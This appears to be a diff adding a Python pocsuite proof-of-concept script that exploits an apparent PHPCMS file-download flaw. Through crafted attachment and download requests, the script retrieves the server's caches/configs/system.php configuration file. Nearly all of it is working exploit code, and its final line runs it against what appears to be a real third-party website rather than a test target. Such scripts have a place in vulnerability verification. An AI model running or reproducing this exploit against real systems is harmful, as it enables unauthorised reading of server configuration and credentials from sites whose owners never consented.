@@ -1,0 +1,50 @@
+
+#!/usr/bin/env python
+# coding: utf-8
+from pocsuite.api.request import req
+import re
+import urlparse
+import traceback
+def _verify(url):
+    try:
+
+        head = {'User-Agent': 'Mozilla/5.0'}
+
+        # 获取当前的siteid
+        getsiteid_url = urlparse.urljoin(url, 'index.php?m=wap&c=index&a=init&siteid=1')
+        print getsiteid_url
+
+        resp = req.get(getsiteid_url,headers=head)
+
+        g_cookie = resp.headers['set-cookie']
+
+        siteid = re.findall("_siteid=([\w-]+)", g_cookie)[0]
+
+        # 获取分配的att_json
+        payload = 'index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3Dcaches%2fconfigs%2fsystem.p%26f=hp%3%252%2*77C'
+
+        vulurl = urlparse.urljoin(url, payload)
+
+        resp = req.post(vulurl, data={'userid_flash': siteid}, headers=head)
+
+        g_cookie = resp.headers['set-cookie']
+
+        g_attjson_cookie = re.findall("att_json=([\w-]+)", g_cookie)[0]
+
+        # download
+        vulurl = urlparse.urljoin(url, 'index.php?m=content&c=down&a=init&a_k=' + g_attjson_cookie)
+
+        resp = req.get(vulurl, headers=head).content
+
+        download_url = re.findall('<a href="(.*)" ', resp)[0]
+
+        download_url = urlparse.urljoin(url, 'index.php' + download_url)
+
+        resp = req.get(download_url, headers=head).content
+
+        if '<?php' in resp:
+            print '存在'
+    except:
+        traceback.print_exc()
+
+_verify('http://www.jcbctv.com/')
